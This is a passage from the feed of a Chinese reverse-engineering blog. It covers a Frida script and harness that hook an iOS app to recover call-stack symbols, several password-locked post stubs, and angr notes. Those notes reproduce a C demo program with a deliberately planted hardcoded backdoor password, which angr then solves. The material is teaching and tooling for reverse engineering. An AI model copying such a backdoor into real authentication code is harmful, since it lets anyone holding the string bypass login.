0; i &lt; count; i++) {        var curMetaMethod = new Array();        var pMetaMethodSEL = method_getName(pMetaMethods.add(i * Process.pointerSize))        var pMetaMethodName = Memory.readCString(Memory.readPointer(pMetaMethodSEL))        var metaMethodIMP = Memory.readPointer(pMetaMethodSEL.add(2*Process.pointerSize))        //XLOG(&quot;+[&quot;+classname+ &quot; &quot; + pMetaMethodName+&quot;]&quot; + &quot;:&quot; + metaMethodIMP)        curMetaMethod.push(pMetaMethodName)        curMetaMethod.push(metaMethodIMP)        allMetaMethods.push(curMetaMethod)    }    allMethods.push(allObjMethods)    allMethods.push(allMetaMethods)    free(pObjMethods);    free(pMetaMethods);    return allMethods;}</code></pre><p>通过调用栈地址根据最近匹配的算法去找到对应的符号信息</p><pre><code class="js">function findSymbolFromAddress(modulePath,addr){    var frameAddr = addr    var theDis = 0xffffffffffffffff;    var tmpDis = 0;    var theClass = &quot;None&quot;    var theMethodName = &quot;None&quot;    var theMethodType = &quot;-&quot;    var theMethodIMP = 0    var allClassInfo = {}    var allClass = getAllClass(modulePath);    for(var i = 0, len = allClass.length; i &lt; len; i++){        var mInfo = getAllMethods(allClass[i]);        var curClassName = allClass[i]        objms = mInfo[0];        for(var j = 0, olen = objms.length; j &lt; olen; j++){            mname = objms[j][0]            mIMP = objms[j][1]            if(frameAddr &gt;= mIMP){                tmpDis = frameAddr-mIMP                if(tmpDis &lt; theDis){                    theDis = tmpDis                    theClass = curClassName                    theMethodName = mname                    theMethodIMP = mIMP                    theMethodType = &quot;-&quot;                }            }        }        metams = mInfo[1];        for(var k = 0, mlen = metams.length; k &lt; mlen; k++){            mname = metams[k][0]            mIMP = metams[k][1]            if(frameAddr &gt;= mIMP){                tmpDis = frameAddr-mIMP                if(tmpDis &lt; theDis){                    theDis = tmpDis                    theClass = curClassName                    theMethodName = mname                    theMethodIMP = mIMP                    theMethodType = &quot;+&quot;                }            }        }    }    symbol = theMethodType+&quot;[&quot;+theClass+&quot; &quot;+theMethodName+&quot;]&quot;    if(symbol.indexOf(&quot;.cxx&quot;)!=-1){        symbol = &quot;maybe C function?&quot;    }    // if distance &gt; 3000, maybe a c function    if(theDis &gt; 3000){        symbol = &quot;maybe C function? symbol:&quot; + symbol    }    return symbol;}</code></pre><p>在匹配算法的最后还进行了一些判断，当解析出来的方法名包含<code>.cxx</code>方法的时候说明没找到符号，可能是一个C函数。当解析出来的方法地址距离目标地址距离大于3000的时候会提示可能会C函数。</p><p>最后完整的项目地址：<a href="https://github.com/4ch12dy/xia0FridaScript">https://github.com/4ch12dy/xia0FridaScript</a></p><h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4><p>我这里写了一个简单的frida脚本去测试如何导入符号恢复的js脚本</p><pre><code class="python">#!/usr/bin/pythonimport fridaimport sys import codecsimport osPACKAGE_NAME = &quot;cn.xiaobu.pipiPlay&quot;def on_message(message, data):    try:        if message:            print(&quot;[JSBACH] {0}&quot;.format(message[&quot;payload&quot;]))    except Exception as e:        print(message)        print(e)def xia0CallStackSymbolsTest():    script_dir = os.path.dirname(os.path.realpath(__file__))    xia0CallStackSymbolsJS = os.path.join(script_dir, &#39;xia0CallStackSymbols.js&#39;)    source = &#39;&#39;    with codecs.open(xia0CallStackSymbolsJS, &#39;r&#39;, &#39;utf-8&#39;) as f:        source = source + f.read()    js = &#39;&#39;&#39;    if (ObjC.available)    {            try            {                    //Your class name here  - ZYOperationView operationCopyLink                    var className = &quot;ZYMediaDownloadHelper&quot;;                    //Your function name here                    var funcName = &quot;+ downloadMediaUrl:isVideo:progress:finishBlock:&quot;;                    var hook = eval(&#39;ObjC.classes.&#39; + className + &#39;[&quot;&#39; + funcName + &#39;&quot;]&#39;);                    Interceptor.attach(hook.implementation, {                        onEnter: function(args) {                            // args[0] is self                            // args[1] is selector (SEL &quot;sendMessageWithText:&quot;)                            // args[2] holds the first function argument, an NSString                            console.log(&quot;[*] Detected call to: &quot; + className + &quot; -&gt; &quot; + funcName);                            // just call [NSThread callStackSymbols]                            var threadClass = ObjC.classes.NSThread                            var symbols = threadClass[&quot;+ callStackSymbols&quot;]()                            console.log(symbols)                            // call  xia0CallStackSymbols [true:just symbolish mainModule address false:symbolish all module address]                            xia0CallStackSymbols(true);                            xia0CallStackSymbols(false);                        }                    });            }            catch(err)            {                    console.log(&quot;[!] Exception2: &quot; + err.message);            }    }    else    {            console.log(&quot;Objective-C Runtime is not available!&quot;);    }    &#39;&#39;&#39;    return source+jsdef do_hook():    return xia0CallStackSymbolsTest()if __name__ == &#39;__main__&#39;:    try:        device = frida.get_device_manager().enumerate_devices()[-1]        print device        pid = device.spawn([PACKAGE_NAME])        print(&quot;[JSBACH] {} is starting. (pid : {})&quot;.format(PACKAGE_NAME, pid))        session = device.attach(pid)        device.resume(pid)        script = session.create_script(do_hook())        script.on(&#39;message&#39;, on_message)        script.load()        sys.stdin.read()    except KeyboardInterrupt:        sys.exit(0)</code></pre><p>只需要将<code>xia0CallStackSymbols.js</code>脚本放到项目中，然后用以下代码即可导入使用</p><pre><code class="python">script_dir = os.path.dirname(os.path.realpath(__file__))xia0CallStackSymbolsJS = os.path.join(script_dir, &#39;xia0CallStackSymbols.js&#39;)source = &#39;&#39;with codecs.open(xia0CallStackSymbolsJS, &#39;r&#39;, &#39;utf-8&#39;) as f:    source = source + f.read()your_frida_js_hook_script = &quot;&quot;load_js = your_frida_js_hook_script+source</code></pre><p>恢复的效果如下：</p><ul><li><p>通过<code>[NSThread callStackSymbols]</code>获取的调用栈符号</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/xia0CallStackSymbols/image-20190702181519237.png?raw=true" alt="image-20190702181519237"></p></li><li><p>通过调用<code>xia0CallStackSymbols</code>函数获取的调用栈符号</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/xia0CallStackSymbols/image-20190702181145710.png?raw=true" alt="image-20190702181145710"></p></li><li><p>作为比较，我在放上lldb中恢复调用栈</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/xia0CallStackSymbols/image-20190702181638614.png?raw=true" alt="image-20190702181638614"></p></li></ul><p>这里可以看出lldb调试器恢复的符号信息最完整且准确，lldb的栈符号恢复项目在<a href="https://github.com/4ch12dy/xia0LLDB">这里</a>，现在还能支持block函数的符号恢复。</p><p>这里有几个问题需要说明一下：</p><ul><li><p>xia0CallStackSymbols的符号为什么前15个地址没有显示？</p><p>因为前15个地址都是frida中js解释器里面的函数执行地址，没有办法拿到模块信息，也没必要解析这些地址。</p></li><li><p>xia0CallStackSymbols中还提供了内存对应的文件地址，如果你觉得符号有问题，可以直接去ida中手动查找符号</p></li><li><p>如果用dladdr能够拿到地址的符号信息，就没有调用xia0CallStackSymbols去恢复(比如符号表没有strip的情况)</p></li><li><p>xia0CallStackSymbols()接口可以传递一个bool参数，true为仅仅解析主模块的地址，false为所有模块都需要解析。实际在逆向过程中一般只需要主模块的符号信息，其他系统函数没很大必要。</p></li></ul><h4 id="遗留问题-Todo"><a href="#遗留问题-Todo" class="headerlink" title="遗留问题/Todo"></a>遗留问题/Todo</h4><ul><li>在执行恢复符号的过程中时间相对较长，主要原因在于每一个地址都要和所有方法比较，这里建议xia0CallStackSymbols传入true，这样只解析主模块的地址。耗时的原因还在于每一个地址解析的时候都会去调用接口获取所有方法信息，实际上每个模块只需要一次就能拿到所有方法信息，接下来要做的就是优化相关代码，缓存模块的所有方法信息，下次解析的地址为该模块时直接去缓存里面匹配查找。</li><li>在匹配符号的过程中，判断是否为C函数需要更多的原则，3000的阈值需要后面再调下。</li><li>关于block的符号恢复，目前只有在lldb中实现了，下一步准备在xia0CallStackSymbols中也支持恢复block函数符号</li></ul><h4 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h4><p>短视频下载去水印如果有人感兴趣的话，可以点<a href="https://github.com/4ch12dy/fkwatermark">这里</a>，目前支持的有皮皮搞笑、抖音（我不看抖音！）</p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><a href="https://github.com/poxyran/misc">https://github.com/poxyran/misc</a></li><li>&lt; <a href="https://github.com/iddoeldor/frida-snippets">https://github.com/iddoeldor/frida-snippets</a> &gt;</li><li><a href="http://www.blogfshare.com/ioss-validate-address.html" target="_blank" rel="external">http://www.blogfshare.com/ioss-validate-address.html</a></li><li><a href="https://jmpews.github.io/2017/08/09/darwin/反注入及绕过/" target="_blank" rel="external">https://jmpews.github.io/2017/08/09/darwin/%E5%8F%8D%E6%B3%A8%E5%85%A5%E5%8F%8A%E7%BB%95%E8%BF%87/</a></li><li><a href="https://github.com/interference-security/frida-scripts">https://github.com/interference-security/frida-scripts</a></li><li><a href="https://github.com/dweinstein/awesome-frida">https://github.com/dweinstein/awesome-frida</a></li><li><a href="https://www.frida.re/docs/javascript-api/" target="_blank" rel="external">https://www.frida.re/docs/javascript-api/</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;Frida调用栈符号恢复&quot;&gt;&lt;a href=&quot;#Frida调用栈符号恢复&quot; class=&quot;headerlink&quot; title=&quot;Frida调用栈符号恢复&quot;&gt;&lt;/a&gt;Frida调用栈符号恢复&lt;/h3&gt;&lt;h4 id=&quot;开始&quot;&gt;&lt;a href=&quot;#开始&quot; class=&quot;
      
    
    </summary>
    
      <category term="re" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/re/"/>
    
    
      <category term="frida" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/frida/"/>
    
      <category term="iosre" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/iosre/"/>
    
  </entry>
  
  <entry>
    <title>andoid调试深度总结</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/06/04/andoid%E8%B0%83%E8%AF%95%E6%B7%B1%E5%BA%A6%E6%80%BB%E7%BB%93/andoid%E8%B0%83%E8%AF%95%E6%B7%B1%E5%BA%A6%E6%80%BB%E7%BB%93/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/06/04/andoid调试深度总结/andoid调试深度总结/</id>
    <published>2019-06-04T14:54:21.000Z</published>
    <updated>2019-06-05T06:57:29.464Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">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</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Android Auto.js脚本加密分析</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/25/autojs%E5%8A%A0%E5%AF%86%E5%88%86%E6%9E%90/autojs%E5%8A%A0%E5%AF%86%E5%88%86%E6%9E%90/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/25/autojs加密分析/autojs加密分析/</id>
    <published>2019-04-25T07:12:09.000Z</published>
    <updated>2019-04-30T02:52:18.678Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="show me the code" />    <label for="pass">show me the code</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="re" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/re/"/>
    
    
      <category term="android" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/android/"/>
    
      <category term="auto.js" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/auto-js/"/>
    
  </entry>
  
  <entry>
    <title>符号执行解决代码混淆实践</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/15/antiOLLVM/antiOLLVM/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/15/antiOLLVM/antiOLLVM/</id>
    <published>2019-04-15T06:42:12.000Z</published>
    <updated>2019-05-17T08:47:41.244Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="re" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/re/"/>
    
    
      <category term="angr" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/angr/"/>
    
      <category term="ollvm" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/ollvm/"/>
    
  </entry>
  
  <entry>
    <title>再谈arm指令编码</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/15/arm-instruction-encode/arm-instruction-encode/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/15/arm-instruction-encode/arm-instruction-encode/</id>
    <published>2019-04-15T06:42:12.000Z</published>
    <updated>2019-04-29T11:59:18.079Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="note" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/note/"/>
    
    
      <category term="arm" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/arm/"/>
    
  </entry>
  
  <entry>
    <title>angr learning note</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/03/angr-learning-note/angr-learning-note/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/03/angr-learning-note/angr-learning-note/</id>
    <published>2019-04-03T06:29:25.000Z</published>
    <updated>2019-04-19T11:33:50.615Z</updated>
    
    <content type="html"><![CDATA[<h3 id="angr学习笔记"><a href="#angr学习笔记" class="headerlink" title="angr学习笔记"></a>angr学习笔记</h3><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><p>macOS平台上面安装angr的时候还是折腾了一会，刚开始网上都说angr对python3不兼容，然后用python2去安装，但是<code>pip install angr</code>却有问题，然后看官方的文档才发现angr现在主要支持python3，python2不再支持了，反正最新版的angr安装不了(virtualenv需要python3)，要用python2的话，可以安装以前版本的。</p><blockquote><p>It is built for Python 3: Python 2 support is not feasable due to the looming EOL and the small size of our team.</p></blockquote><p>既然官方都这么说了，没理由不安装python3版本的，<code>pip3 install angr</code>一把梭吧。然后又报错了</p><pre><code class="bash">SystemExit: error: [Errno 2] No such file or directory: &#39;libunicorn.dylib&#39;</code></pre><p>明显是在安装unicorn的时候没安装成功，导致找不到其动态库。angr文档中也提及到了这个问题</p><blockquote><p>Building <code>unicorn</code> from source requires Python 2, so will fail inside a virtualenv where <code>python</code> gets you Python 3. If you encounter errors with <code>pip install angr</code>, you may need to first install <code>unicorn</code> separately, pointing it to your Python 2: <code>UNICORN_QEMU_FLAGS=&quot;--python=/path/to/python2&quot; pip install unicorn  # Python 2 is probably /usr/bin/python on your macOS system</code></p></blockquote><p>意思是unicorn兼容python2的，我本机之前已经安装了python2的unicorn，按照文档做还是不行，既然angr依赖unicorn，不如手动安装python3的unicorn。去unicorn的项目中发现可以绑定python3。</p><pre><code class="bash">$ cd bindings/python$ sudo make install3$ python3 -c &quot;import unicorn; print(unicorn.__version__)&quot;1.0.0</code></pre><p>通过这样，我的python3环境中也安装了unicorn。这时候再执行<code>pip3 install angr</code>这下一路畅通，安装完成。</p><p>迫不及待尝试导入angr试下，结果又报错了</p><pre><code>angr.state_plugins.unicorn_engine | failed loading &quot;angr_native.dylib&quot;, unicorn support disabled (dlopen(/usr/local/lib/python3.7/site-packages/angr/lib/angr_native.dylib, 6): Library not loaded: libpyvex.dylib  Referenced from: /usr/local/lib/python3.7/site-packages/angr/lib/angr_native.dylib  Reason: image not found)</code></pre><p>这个错误很明显，就是<code>angr_native.dylib</code>中加载<code>libpyvex.dylib</code>的时候找不到该动态库。看了下<code>angr_native.dylib</code>的macho格式里load command中加载<code>libpyvex.dylib</code>部分，发现是在其当前目录下去查找<code>libpyvex.dylib</code>和<code>libunicorn.1.dylib</code>。关于这个问题其实官方文档中也提及到这个问题</p><pre><code class="bash">PYVEX=`python3 -c &#39;import pyvex; print(pyvex.__path__[0])&#39;`UNICORN=`python3 -c &#39;import unicorn; print(unicorn.__path__[0])&#39;`ANGR=`python3 -c &#39;import angr; print(angr.__path__[0])&#39;`install_name_tool -change libunicorn.1.dylib &quot;$UNICORN&quot;/lib/libunicorn.dylib &quot;$ANGR&quot;/lib/angr_native.dylibinstall_name_tool -change libpyvex.dylib &quot;$PYVEX&quot;/lib/libpyvex.dylib &quot;$ANGR&quot;/lib/angr_native.dylib</code></pre><p>就是通过重新指定加载<code>libunicorn.dylib</code>和<code>libpyvex.dylib</code> 的位置。执行完脚本以后，angr算是安装完成了。</p><h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><p>直接上例子来学习，官方的fauxware例子</p><p>C源码如下</p><pre><code class="c">#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;#include &lt;fcntl.h&gt;#include &lt;stdlib.h&gt;char *sneaky = &quot;SOSNEAKY&quot;;int authenticate(char *username, char *password){    char stored_pw[9];    stored_pw[8] = 0;    int pwfile;    // evil back d00r    if (strcmp(password, sneaky) == 0) return 1;    pwfile = open(username, O_RDONLY);    read(pwfile, stored_pw, 8);    if (strcmp(password, stored_pw) == 0) return 1;    return 0;}int accepted(){    printf(&quot;Welcome to the admin console, trusted user!\n&quot;);}int rejected(){    printf(&quot;Go away!&quot;);    exit(1);}int main(int argc, char **argv){    char username[9];    char password[9];    int authed;    username[8] = 0;    password[8] = 0;    printf(&quot;Username: \n&quot;);    read(0, username, 8);    read(0, &amp;authed, 1);    printf(&quot;Password: \n&quot;);    read(0, password, 8);    read(0, &amp;authed, 1);    authed = authenticate(username, password);    if (authed) accepted();    else rejected();}</code></pre><p>简单解释下程序就是程序有一个后门，当输入的password为SOSNEAKY即可通过。下面我们用angr来求解出成功的输入</p><pre><code class="python">import angrfilename = &#39;the/filepath/of/fauxware&#39;proj = angr.Project(filename, auto_load_libs=False)st = proj.factory.entry_state()while True:    succ = st.step()    if len(succ.successors) == 2:        break    st = succ.successors[0]st1, st2 = succ.successorsprint(st1, st2)print(st1.posix.dumps(0))print(st2.posix.dumps(0))</code></pre><p>下面解释下这个python代码</p><p><code>proj = angr.Project(filename, auto_load_libs=False)</code>加载一个二进制文件，然后得到一个程序开始处的状态<code>st = proj.factory.entry_state()</code>下面从这个状态开始，一直运行直到出现分支。最后获取此时的两个状态。打印出满足条件的输入值。</p><pre><code>&lt;SimState @ 0x400692&gt; &lt;SimState @ 0x400699&gt;b&#39;\x00\x00\x00\x00\x00\x00\x00\x00\x00SOSNEAKY\x00&#39;b&#39;\x00\x00\x00\x00\x00\x00\x00\x00\x00S\x80\x80\x80@\x80\x80\x00\x00&#39;</code></pre><p>可以看出st1也就是成功授权的输入为SOSNEAKY。</p><h4 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h4><h5 id="factory"><a href="#factory" class="headerlink" title="factory"></a>factory</h5><p>该对象提供了大多数的功能，能够将二进制对象分解为很方便处理的对象。</p><ul><li><p>blocks</p><p><code>project.factory.block()</code>给定一个地址，返回其basic block，这里的block与llvm中的block一致。获取了block就能进一步对其指令等操作。</p><pre><code class="python">block = proj.factory.block(proj.entry)block.pp() # 打印block反汇编代码block.instructions # 指令个数block.instruction_addrs # 指令地址list</code></pre></li><li><p>states</p><p>angr里面很重要的一个对象，代表了程序的一个实例镜像，是模拟执行某个时刻的状态。</p><pre><code class="python">state = proj.factory.entry_state()&lt;SimState @ 0x401670&gt;</code></pre><p>既然是程序模拟运行过程中的某个状态，那么SimState就包含了程序内存，寄存器，文件系统等数据。而且这些数据是可以被修改。</p><pre><code class="python"># 访问寄存器和内存&gt;&gt;&gt; state.regs.rip        # get the current instruction pointer&lt;BV64 0x401670&gt;&gt;&gt;&gt; state.regs.rax&lt;BV64 0x1c&gt;&gt;&gt;&gt; state.mem[proj.entry].int.resolved  # interpret the memory at the entry point as a C int&lt;BV32 0x8949ed31&gt;# 修改寄存器和内存&gt;&gt;&gt; state.regs.rsi = state.solver.BVV(3, 64)&gt;&gt;&gt; state.regs.rsi&lt;BV64 0x3&gt;&gt;&gt;&gt; state.mem[0x1000].long = 4&gt;&gt;&gt; state.mem[0x1000].long.resolved&lt;BV64 0x4&gt;</code></pre><p>这些数据都是bitvectors，所以需要一个转换</p><pre><code class="python">&gt;&gt;&gt; bv = state.solver.BVV(0x1234, 32)       # create a 32-bit-wide bitvector with value 0x1234&lt;BV32 0x1234&gt;                               # BVV stands for bitvector value&gt;&gt;&gt; state.solver.eval(bv)                # convert to python int0x1234</code></pre><p><code>mem</code>有几点需要注意：</p><ul><li><code>.type</code>有<code>char, short, int, long, size_t, uint8_t, uint16_t</code>等</li><li><code>.resolved</code>得到bitvector；<code>.concrete</code>得到int值</li></ul></li><li><p>simulation managers</p><p>state代表了某个时刻的程序状态，那么simulation managers就代表了程序如何进入下一个state。</p><pre><code class="python">&gt;&gt;&gt; simgr = proj.factory.simulation_manager(state)&lt;SimulationManager with 1 active&gt;&gt;&gt;&gt; simgr.active[&lt;SimState @ 0x401670&gt;]</code></pre><p>这里我们用state去初始化了simulation managers得到了一组state。<code>.active</code>返回当前state。</p><pre><code class="python">&gt;&gt;&gt; simgr.step()&gt;&gt;&gt; simgr.active[&lt;SimState @ 0x1020300&gt;]&gt;&gt;&gt; simgr.active[0].regs.rip                 # new and exciting!&lt;BV64 0x1020300&gt;&gt;&gt;&gt; state.regs.rip                           # still the same!&lt;BV64 0x401670&gt;</code></pre><p>通过上面的方法去执行程序，这样会得到下一个state，此时active的state已经变了，step方法会执行到下一个basic block。之前的state仍然保留不变。</p></li></ul><h4 id="待更新"><a href="#待更新" class="headerlink" title="待更新"></a>待更新</h4><p>…</p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><a href="https://docs.angr.io/core-concepts/" target="_blank" rel="external">https://docs.angr.io/core-concepts/</a></li><li><a href="https://www.secpulse.com/archives/83197.html" target="_blank" rel="external">https://www.secpulse.com/archives/83197.html</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;angr学习笔记&quot;&gt;&lt;a href=&quot;#angr学习笔记&quot; class=&quot;headerlink&quot; title=&quot;angr学习笔记&quot;&gt;&lt;/a&gt;angr学习笔记&lt;/h3&gt;&lt;h4 id=&quot;安装&quot;&gt;&lt;a href=&quot;#安装&quot; class=&quot;headerlink&quot; titl
      
    
    </summary>
    
      <category term="note" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/note/"/>
    
    
      <category term="angr" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/angr/"/>
    
  </entry>
  
  <entry>
    <title>applepie writeup分析</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/02/applepie/applepie/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/02/applepie/applepie/</id>
    <published>2019-04-02T06:02:40.000Z</published>
    <updated>2019-04-30T04:08:21.329Z</updated>
    
